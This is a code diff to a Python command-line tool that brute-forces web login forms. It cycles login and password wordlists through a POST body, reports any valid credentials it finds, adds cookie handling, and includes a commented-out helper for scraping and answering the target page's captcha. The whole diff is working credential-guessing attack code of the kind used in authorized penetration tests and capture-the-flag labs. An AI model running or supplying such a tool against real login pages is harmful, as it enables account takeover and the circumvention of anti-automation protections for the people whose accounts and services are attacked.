@@ -1,3 +1,8 @@
+
+
+
+
+
 import requests
 import argparse
 import random
@@ -25,22 +30,26 @@ def checkMsg(text):
     return False
 
 
-def check(url, data):
-    result = requests.post(url, data=data, headers=CONF['headers'], cookies=CONF['cookies'])
-    return result.status_code, checkMsg(result.text)
+def check(res_code, res_text):
+    if res_code >= 200 and res_code < 400:
+        return checkMsg(res_text)
+
+    else:
+        print('[-]', res_code)
+        return False
 
 
 def query(url, data):
-    
     result = requests.post(url, data=data, headers=CONF['headers'], cookies=CONF['cookies'])
-    #print(result.status_code, result.text)
+    return result.status_code, result.text
 
-    if result.status_code >= 200 and result.status_code < 400:
-        return checkMsg(result.text)
 
-    else:
-        print('[-]', result.status_code)
-        return False
+def extractCaptcha(txt):
+    idx = txt.find("Captcha enabled</h3></b></label><br>")
+    idx2 = txt.find("= ?", idx)
+    txt = txt[idx+40:idx2].strip()
+    return txt
+    
 
 
 def fileReader(filename):
@@ -58,7 +67,7 @@ parser.add_argument('-u', '--url', metavar='URL', required=True, help='URL to br
 parser.add_argument('-L', '--logins', metavar='LOGIN WORDLIST', required=True, help='Login file')
 parser.add_argument('-P', '--passwords', metavar='PASSWORD WORDLIST', required=True, help='Passwords file')
 parser.add_argument('-x', '--headers', metavar='HEADER', action='append', help='Additionnal headers, format HEADER:VALUE')
-parser.add_argument('-c', '--cookies', metavar='COOKIES', help='Cookies. Standard format : var1=val1;var2=val2')
+parser.add_argument('-c', '--cookies', metavar='COOKIES', action='append', help='Cookies. Standard format : NAME:VALUE')
 parser.add_argument('-d', '--data', metavar='DATA', required=True, help='POST body to send. Standard format : var1=val1&var2=val2 Use ^USER^ and ^PASS^ as placeholders')
 group = parser.add_mutually_exclusive_group(required=True)
 group.add_argument('-s', '--success', metavar='MSG SUCCESS', help='Success string to look for')
@@ -69,10 +78,17 @@ args, leftovers = parser.parse_known_args()
 CONF['success'] = args.success
 CONF['failure'] = args.failure
 
-for h in args.headers:
-    idx = h.find(':')
-    if idx > -1:
-        CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()
+if args.cookies:
+    for c in args.cookies:
+        idx = c.find(':')
+        if idx > -1:
+            CONF['cookies'][c[0:idx].strip()] = c[idx+1:].strip()
+
+if args.headers:
+    for h in args.headers:
+        idx = h.find(':')
+        if idx > -1:
+            CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()
 
 print("[+] URL :", args.url)
 
@@ -81,12 +97,12 @@ print("[+] URL :", args.url)
 login = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
 datatmp = args.data.replace("^USER^", login).replace("^PASS^", password)
-res_code, res_check = check(args.url, datatmp)
+res_code, res_text = query(args.url, datatmp)
 
 if res_code != 200:
     print('[!] Beware URL is returning status code', res_code)
 
-if res_check:
+if checkMsg(res_text):
     print('[!] Beware URL is validating your success/failure condition with random credentials')
 
 
@@ -106,10 +122,15 @@ while True:
         passwordIterator = fileReader(args.passwords)
         password = next(passwordIterator)
 
-    datatmp = args.data.replace("^USER^", login).replace("^PASS^", password)
+    #captcha = extractCaptcha(res_text)
+
+    datatmp = args.data.replace("^USER^", login).replace("^PASS^", password) #.replace("^CAPTCHA^", captcha)
     CONF['headers']['Content-Length'] = str(len(datatmp))
 
-    if query(args.url, datatmp):
+    res_code, res_text = query(args.url, datatmp)
+
+
+    if check(res_code, res_text):
         print("[+] Found valid credentials :", login, "/", password)
         found = True
 
